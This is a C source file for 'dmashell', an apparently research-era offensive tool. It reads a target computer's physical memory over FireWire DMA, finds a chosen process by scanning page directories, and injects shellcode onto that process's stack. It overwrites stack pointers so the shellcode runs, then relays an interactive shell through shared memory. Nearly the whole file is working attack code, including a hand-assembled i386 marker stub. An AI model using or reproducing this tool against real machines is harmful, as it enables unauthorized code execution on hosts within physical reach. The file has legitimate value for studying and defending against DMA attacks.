/*  $Id$
 *  vim: fdm=marker
 *
 *  dmashell: inject shellcode and use it via 
 *
 *  Copyright (C) 2007
 *  losTrace aka "David R. Piegdon"
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License version 2, as
 *  published by the Free Software Foundation.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 */

#define _LARGEFILE64_SOURCE
// required for memmem:
#define _GNU_SOURCE

#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>
#include <string.h>

#include <signal.h>

#include <physical.h>
#include <linear.h>
#include <endian_swap.h>

#include "proc_info.h"
#include "term.h"

enum memsource {
	SOURCE_UNDEFINED,
	SOURCE_MEMDUMP,
	SOURCE_IEEE1394
};

char pagedir[4096];

#define NODE_OFFSET     0xffc0

// tries to inject the given code-blob with a marker-code in front of it into a process.
// values of aggressiveness:
// 	 & 1: write (but only at locations that are pointers into the binary)
// 	 & 2: also try anywhere that may be a pointer to 0x08~~~~~~ or 0xb7~~~~~~ (does not write if not &1)
// return virtual address of injected code.
uint32_t try_inject(linear_handle lin, addr_t pagedir, char *injectcode, int injectcodelen, int aggressiveness)
{{{
	// i386-code that marks itself when being executed:
	//
	// runtime ESP is saved @9; possible new ESP is loaded from there (if != 0xffffffff)
	// the 0x11 0xee 0xee 0x11 @5 change to 0xee 0x11 0x11 0xee
	static const char marker[] = {
				//				start:
				0xe8, 0x08, 0x00, 0x00, 0x00,	//			call near string_get_address
				0x11, 0xee, 0xee, 0x11,		//			dd	0x11eeee11
				0xff, 0xff, 0xff, 0xff,		//			dd	0xffffffff
				//				string_get_address:
				0x5a,				//			pop	edx
				0x8b, 0x42, 0x04,		//			mov	eax, [edx+4]
				0x89, 0x62, 0x04,		//			mov	[edx+4], esp
				0x3d, 0xff, 0xff, 0xff, 0xff,	//			cmp	eax,0xffffffff
				0x74, 0x02,			//			je	set_esp_done
				0x89, 0xc4,			//			mov	esp,eax
				//				set_esp_done:
				0x8b, 0x02,			//			mov	eax, [edx]
				0xf7, 0xd0,			//			not	eax
				0x89, 0x02			//			mov	[edx], eax
	};

#define MARKER_LEN     35
#define MARK_OFFSET    5
#define MARK_UNCHANGED 0x11eeee11
#define MARK_CHANGED   0xee1111ee
#define ESP_OFFSET     9
#define ESP_UNCHANGED  0xffffffff

	addr_t stack_bottom;
	addr_t binary_first;
	addr_t binary_last;
	addr_t code_location;
	addr_t mark_location;
	char*code;
	int codelen;

	printf("\t" TERM_BLUE"aggressiveness: %s, %s" TERM_RESET "\n",
			(aggressiveness&1)? "writing"         : "pretending",
			(aggressiveness&2)? "binary and libs" : "only binary"
		);

	// we attach a self-changing marker to the shellcode. this way we can test,
	// if the shellcode has been executed, yet.
	codelen = injectcodelen + MARKER_LEN;
	code = malloc(codelen + 1);
	memcpy(code, marker, MARKER_LEN);
	memcpy(code + MARKER_LEN, injectcode, injectcodelen);

	// seek the stack-page with environment and stuff
	stack_bottom = linear_seek_mapped_page(lin, 0xbffff, 0x1000, -1);

	// now we will inject the code.

	// seek bounds of mapped binary
	binary_first = linear_seek_mapped_page(lin, 0x08000, 0x1000, 1);
	binary_last = linear_seek_unmapped_page(lin, binary_first, 0x1000, 1);

	if( ((int64_t)stack_bottom == -1) || ((int64_t)binary_first == -1) || ((int64_t)binary_last == -1) ) {
		printf("\tfailed to find stack or binary bounds!\n"
			"\taborting!\n");
		return -1;
	}

	binary_last--;				// go to last mapped
	binary_first = binary_first << 12;	// get addresses from pagenumbers
	binary_last = binary_last << 12;

	//
	//insert code at offset zero of this page.
	code_location = (stack_bottom << 12);
	mark_location = code_location + MARK_OFFSET;
	printf("\tinserting code into the stack at 0x%08llx\n", code_location);
	if(aggressiveness & 1)
		if(linear_write(lin, code_location, code, codelen)) {
			printf(TERM_RED"failed to inject code!"TERM_RESET"\n");
			return -1;
		}

	printf("\tdone. press key to overwrite pointers on stack...\n");
	getchar();

	// replace all interesting pointers on stack with pointer to our code
	// this part is tricky... we will overwrite value by value. if one of
	// these is dereferenced by the target, we do not know this.
	//
	// so we will test if the process exists before each write to a value
	// (by testing if the pagetable of the process still exists).
	uint32_t stackvalue;			// buffer for loading values from stack
	uint32_t dest_value;			// the value we wish to write
	uint32_t mark_value;			// value of the mark
	addr_t seeker;				// pointer for seeking over the stack
	int top_of_stack = 0;			// marked, if there was one stack-page unmapped

	seeker = code_location;
	seeker = seeker - (seeker & 3);		// align to 32 bit locations.
	dest_value = code_location;
#if __BYTE_ORDER == __BIG_ENDIAN
	dest_value = endian_swap32(dest_value);
#endif
	linear_read(lin, mark_location, &mark_value, 4);
	printf("\t* mark is 0x%08x\n",mark_value);
	while(!(aggressiveness & 0) || (mark_value == MARK_UNCHANGED)) {
		if(linear_is_pagedir_fast(lin, pagedir)) {
			if(0 > linear_read(lin, seeker, &stackvalue, 4)) {
				if(top_of_stack) {
					printf("\t" TERM_YELLOW "reached end of stack. aborting." TERM_RESET "\n");
					break;
				} else {
					printf("\t" TERM_BLUE "possibly reached top of stack." TERM_RESET "trying one more\n");
					top_of_stack = 1;
					seeker -= 4096 - 4;
				}
			} else {
				top_of_stack = 0;
			}
#if __BYTE_ORDER == __BIG_ENDIAN
			stackvalue = endian_swap32(stackvalue);
#endif
			if(aggressiveness & 2) {
				if( (stackvalue >= 0x08000000 && stackvalue <= 0x08ffffff)
				  ||(stackvalue >= 0xb7000000 && stackvalue <= 0xb7ffffff) ) {
					printf("\t\toverwriting value at 0x%08llx: 0x%08x with codebase\n", seeker, stackvalue);
					// could be a value; just overwrite it.
					if(aggressiveness & 1)
						linear_write(lin, seeker, &dest_value, 4);
				}
			} else {
				if( (stackvalue > binary_first) && (stackvalue < binary_last) ) {
					printf("\t\toverwriting value at 0x%08llx: 0x%08x with codebase\n", seeker, stackvalue);
					// could be a value; just overwrite it.
					if(aggressiveness & 1)
						linear_write(lin, seeker, &dest_value, 4);
				}
			}
		} else {
			printf("\t" TERM_YELLOW "process vanished" TERM_RESET "\n");
			break;
		}
		seeker -= 4;
		linear_read(lin, mark_location, &mark_value, 4);
	}
	printf("\t* mark is 0x%08x\n",mark_value);
	linear_read(lin, mark_location + ( ESP_OFFSET - MARK_OFFSET ), &mark_value, 4);
	printf("\t* ESP was 0x%08x\n",mark_value);

	return code_location + MARKER_LEN;
}}}

volatile int do_terminate = 0;

// set STDIN to blocking mode
void set_blocking_stdin()
{{{
	int flags;
	// set STDIN to blocking.
	flags = fcntl(STDIN_FILENO, F_GETFL);
	flags -= O_NONBLOCK;
	fcntl(STDIN_FILENO, F_SETFL, flags);
}}}

// set STDIN to non-blocking mode
void set_nonblocking_stdin()
{{{
	int flags;
	// set STDIN to non-blocking.
	flags = fcntl(STDIN_FILENO, F_GETFL);
	flags |= O_NONBLOCK;
	fcntl(STDIN_FILENO, F_SETFL, flags);
}}}

// show user some options and ask for his choice
// (thinks like kill shell, reset firewire bus, rescan for process, ...
void handle_sigint(int __attribute__ ((__unused__)) signal)
{{{
	set_blocking_stdin();
	printf(TERM_YELLOW "\n(dmashell)" TERM_RESET " received SIGINT.\n"
	       TERM_YELLOW "(dmashell)" TERM_RESET " use SIGQUIT (CTRL-\\) at any time to terminate process without any further notice or actions\n"
	       TERM_YELLOW "(dmashell)" TERM_RESET " press enter to just continue\n"
	       TERM_YELLOW "(dmashell)" TERM_RESET " press k to tell shellcode to send a SIGKILL to the shell\n"
	       TERM_YELLOW "(dmashell)" TERM_RESET " press q to terminate dmashell NOW (same as CTRL-\\)\n"
/*	       TERM_YELLOW "(dmashell)" TERM_RESET " press s to rescan memory for the processes pagedirectory\n"
	       TERM_YELLOW "(dmashell)" TERM_RESET " press f to rescan the firewire-bus for the attacked host\n"
	       TERM_YELLOW "(dmashell)" TERM_RESET " press r to initiate a firewire-bus-reset\n"  */
	      );

	switch (getchar()) {
		case 'q':
		case 'Q':
			printf(TERM_YELLOW "(dmashell)" TERM_RESET " terminating " TERM_RED "NOW" TERM_RESET "\n");
			exit(0);
			break;
		case 'k':
		case 'K':
			do_terminate = 1;
			break;
/*
		case 's':
		case 'S':
			// rescan for to-be-attacked process?
			break;
		case 'f':
		case 'F':
			// rescan raw1394 bus for attack-target
			break;
		case 'r':
		case 'R':
			// initiate firewire-bus-reset
			break;
*/
		default:
			printf(TERM_YELLOW "(dmashell)" TERM_RESET " unknown command. skipping back to interactive shellcode\n");
			break;
	}
	set_nonblocking_stdin();
}}}

// then interact with the shellcode
void use_shell(linear_handle lin, uint32_t base)
{{{
	// these depend on the used shellcode:
#define CHILD_IS_DEAD		0x206
#define CHILD_IS_DEAD_ACK	0x207
#define TERMINATE_CHILD		0x208

#define RFRM_WRITER_POS		0x20b
#define RFRM_READER_POS		0x20c
#define RFRM_BUFFER		(0x218 + 20)

#define RTO_WRITER_POS		0x20d
#define RTO_READER_POS		0x20e
#define RTO_BUFFER		(0x218 + 276)

	uint8_t true_value = 0x1;

	uint8_t child_is_dead = 0;

	uint8_t rfrm_writer_pos = 0;
	uint8_t rfrm_reader_pos = 0;
	char    rfrm_buffer[2]; // master -> shell
	int	rfrm_active;

	uint8_t rto_writer_pos = 0;
	uint8_t rto_reader_pos = 0;
	char    rto_buffer[2]; // shell -> master
	int	rto_active;

#define SET_rfrm_writer_pos linear_write_in_page(lin, base + RFRM_WRITER_POS, &rfrm_writer_pos, 1)
#define GET_rfrm_reader_pos linear_read_in_page(lin, base + RFRM_READER_POS, &rfrm_reader_pos, 1)
#define GET_rto_writer_pos linear_read_in_page(lin, base + RTO_WRITER_POS, &rto_writer_pos, 1)
#define SET_rto_reader_pos linear_write_in_page(lin, base + RTO_READER_POS, &rto_reader_pos, 1)
#define GET_child_is_dead linear_read_in_page(lin, base + CHILD_IS_DEAD, &child_is_dead, 1)
#define ACK_child_is_dead linear_write_in_page(lin, base + CHILD_IS_DEAD, &child_is_dead, 1)
#define DO_terminate_child linear_write_in_page(lin, base + TERMINATE_CHILD, &true_value, 1)

	set_nonblocking_stdin();
	// set STDIN to non-blocking.

	printf(TERM_YELLOW "(dmashell)" TERM_RESET " rfrm_writer_pos is @0x%08x (offset 0x%03x).\n", base + RFRM_WRITER_POS, RFRM_WRITER_POS);

	signal(SIGINT, handle_sigint);

	// while the child lives
	while(!child_is_dead) {
		// can we write something?
		GET_rfrm_reader_pos;
		if(rfrm_reader_pos != rfrm_writer_pos + 1) {
			// buffer is not full. let's try to obtain data from stdin
			if(1 == read(STDIN_FILENO, rfrm_buffer, 1)) {
				// there was some data.let's relay it.
				linear_write_in_page(lin, base + RFRM_BUFFER + rfrm_writer_pos, rfrm_buffer, 1);
				rfrm_writer_pos++;
				SET_rfrm_writer_pos;
				rfrm_active = 1;
			} else {
				rfrm_active = 0;
			}
		} else {
			rfrm_active = 0;
		}

		GET_rto_writer_pos;
		if(rto_reader_pos != rto_writer_pos) {
			// buffer is not empty. obtain data and display it.
			linear_read_in_page(lin, base + RTO_BUFFER + rto_reader_pos, rto_buffer, 1);
			rto_reader_pos++;
			SET_rto_reader_pos;
			rto_active = 1;
			putchar(rto_buffer[0]);
		} else {
			rto_active = 0;
		}

		if(do_terminate) {
			do_terminate = 0;
			DO_terminate_child;
			printf(TERM_YELLOW "(dmashell)" TERM_RESET " SIGKILL relayed.\n");
		}

		if(!rfrm_active && !rto_active)
			usleep(50000);

		if(!child_is_dead)
			GET_child_is_dead;
	}
	// FIXME: we should only do this, if the process exists. we need to test this!
	ACK_child_is_dead;

	set_blocking_stdin();
}}}

// print usage information
void usage(char* argv0)
{{{
	printf( "%s <"TERM_YELLOW"-n nodeid"TERM_RESET"|"TERM_YELLOW"-f filename"TERM_RESET"> -b <binary>\n"
		"\ninject -c <codefile> into first process matching the -b <binary>\n"
		"\t\tgive -p to pretend (then i will not write anything, only read)\n"
		"\t\t* the host connected via firewire with the given nodeid\n"
		"\t\t* the memory dump in the given file\n"
		"\tuse CTRL-C (SIGINT) in interactive-shell-mode for a special menu\n"
		"\tuse CTRL-\\ (SIGQUIT) in interactive-shell-mode\n"
		"\t\tto stop the program without further notice or writes\n",
		argv0);
}}}

// search the given process, inject shellcode, search the process again
// (fork might have changed pagetable's location) and then call use_shell()
int main(int argc, char**argv)
{{{
	physical_handle phy;
	union physical_type_data phy_data;
	linear_handle lin;

	addr_t pn;
	char page[4096];
	float prob;
	int c;
	char *p;
	char *seek_binary = NULL;
	char *inject_file = "shellcodes/dmashellcode.o";
	int pretend = 0;
	int aggressive = 0;

	uint32_t base = 0;

	enum memsource memsource = SOURCE_UNDEFINED;
	char *filename = NULL;
	int nodeid = 0;

	fprintf(stderr,
		"(c) 2007 by losTrace aka ``David R. Piegdon''.\n"
		"This program is distributed WITHOUT ANY WARRANTY; without even the implied\n"
		"warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n"
		"GNU General Public License for more details.\n\n"
		);

	while( -1 != (c = getopt(argc, argv, "pan:f:b:"))) {
		switch (c) {
			case 'p':
				pretend = 1;
				break;
			case 'a':
				aggressive = 1;
				break;
			case 'n':
				// phys.source: ieee1394
				memsource = SOURCE_IEEE1394;
				nodeid = strtoll(optarg, &p, 10);
				if((p&&(*p)) || (nodeid > 63) || (nodeid < 0)) {
					printf("invalid nodeid. nodeid should be >=0 and <64.\n");
					usage(argv[0]);
					return -2;
				}
				break;
			case 'f':
				// phys.source: file
				memsource = SOURCE_MEMDUMP;
				filename = optarg;
				break;
			case 'b':
				seek_binary = optarg;
				break;
			default:
				usage(argv[0]);
				return -2;
				break;
		}
	}
	if(c != -1) {
		printf("too many arguments? (\"%s\")\n", argv[c]);
		usage(argv[0]);
		return -2;
	}

	// create and associate a physical source to /dev/mem
	phy = physical_new_handle();
	if(!phy)
		{ printf("physical handle is null\n"); return -2; }
	if( memsource == SOURCE_IEEE1394 ) {
		// create raw1394handle
		phy_data.ieee1394.raw1394handle = raw1394_new_handle();
		if(!phy_data.ieee1394.raw1394handle)
			{ printf("failed to open raw1394\n"); return -3; }
		// associate raw1394 to port
		if(raw1394_set_port(phy_data.ieee1394.raw1394handle, 0))
			{ printf("raw1394 failed to set port\n"); return -3; }
		// set attack target
		phy_data.ieee1394.raw1394target_nid = nodeid + NODE_OFFSET;
		phy_data.ieee1394.raw1394target_guid = 0;
		printf("using target %d\n", phy_data.ieee1394.raw1394target_nid - NODE_OFFSET);
		if(physical_handle_associate(phy, physical_ieee1394, &phy_data, 4096)) {
			printf("physical_handle_associate() failed\n");
			return -3;
		}
	} else if( memsource == SOURCE_MEMDUMP ) {
		c = open(filename, O_RDONLY);
		if(c < 0) {
			printf("failed to open file \"%s\"\n", filename);
			return -2;
		}
		phy_data.filedescriptor.fd = c;
		if(physical_handle_associate(phy, physical_filedescriptor, &phy_data, 4096)) {
			printf("physical_handle_associate() failed\n");
			return -3;
		}
	} else {
		printf("missing memory source\n");
		usage(argv[0]);
		return -2;
	}

	if(!seek_binary) {
		printf("missing binary to seek\n");
		usage(argv[0]);
		return -2;
	}

	if(!inject_file) {
		printf("missing codefile to inject\n");
		usage(argv[0]);
		return -2;
	}

	// associate linear
	printf("new lin handle..\n"); fflush(stdout);
	lin = linear_new_handle();
	printf("assoc lin handle..\n"); fflush(stdout);
	if(linear_handle_associate(lin, phy, arch_ia32)) {
		printf("failed to associate lin ia32!\n");
		return -5;
	}

	// search all pages in lowmem for pagedirs
	// then, for each found, check process
	for( pn = 0; pn < 0x40000; pn++ ) {
		if((pn%0x100) == 0) {
			printf("0x%05llx\r", pn);
			fflush(stdout);
		}
		if(linear_is_pagedir_fast(lin, pn)) {
			// load page
			physical_read_page(phy, pn, page);
			prob = linear_is_pagedir_probability(lin, page);
			if(prob > 0.01) {
				printf("0x%05llx [~%0.3f] ", pn, prob);
				if(linear_set_new_pagedirectory(lin, page)) {
					printf("\nloading pagedir failed\n");
					continue;
				}

				int argc, envc;
				char **argv, **envv;
				char *bin;

				proc_info(lin, &argc, &argv, &envc, &envv, &bin);
				if(bin) {
					printf("found <\"%s\">\n", bin);
					if(0 == strcmp(bin, seek_binary)) {
						int fd;
#define CODEBUFFERSIZE 4096
						char codebuffer[CODEBUFFERSIZE];
						int codelen;

						printf("\tmatching! beginning inject sequence\n");

						fd = open(inject_file, O_RDONLY);
						if(fd < 0) {
							printf("failed to open codefile \"%s\"!", inject_file);
							break;
						}
						codelen = read(fd, codebuffer, CODEBUFFERSIZE);
						if(codelen < 1) {
							printf("failed to read from codefile \"%s\"! (empty file?)", inject_file);
							break;
						}
						if(codelen == 4095) {
							printf("possibly truncated code after byte 4096.\n"
								"this is the max size for injecting code!\n");
						} else {
							printf("\tgot %d bytes from \"%s\".\n", codelen, inject_file);
						}

						base = try_inject(lin, pn, codebuffer, codelen, (pretend ? 0 : 1) | (aggressive ? 2 : 0));
						if(base != 0xffffffff)
							printf("(possibly injected code at 0x%08x)\n",base);
						close(fd);

						break;
					} else {
						if(envv)
							free(envv);
						if(argv)
							free(argv);
					}
				}
			}
		}
	}
	// the fork of the shellcode may have changed the pagedirectory or even its location.
	// so let's search the process again...
	sleep(1);
	for( pn = 0; pn < 0x40000; pn++ ) {
		if((pn%0x100) == 0) {
			printf("0x%05llx\r", pn);
			fflush(stdout);
		}
		if(linear_is_pagedir_fast(lin, pn)) {
			// load page
			physical_read_page(phy, pn, page);
			prob = linear_is_pagedir_probability(lin, page);
			if(prob > 0.01) {
				printf("0x%05llx [~%0.3f] ", pn, prob);
				if(linear_set_new_pagedirectory(lin, page)) {
					printf("\nloading pagedir failed\n");
					continue;
				}

				int argc, envc;
				char **argv, **envv;
				char *bin;

				proc_info(lin, &argc, &argv, &envc, &envv, &bin);
				if(bin) {
					printf("found <\"%s\">\n", bin);
					if(0 == strcmp(bin, seek_binary)) {
						printf("\tmatching once again.\n");

						use_shell(lin, base);

						break;
					}
				}
			}
		}
	}



	// release handles
	linear_handle_release(lin);
	if( memsource == SOURCE_IEEE1394 )
		raw1394_destroy_handle(phy_data.ieee1394.raw1394handle);
	physical_handle_release(phy);
	
	return 0;
}}}

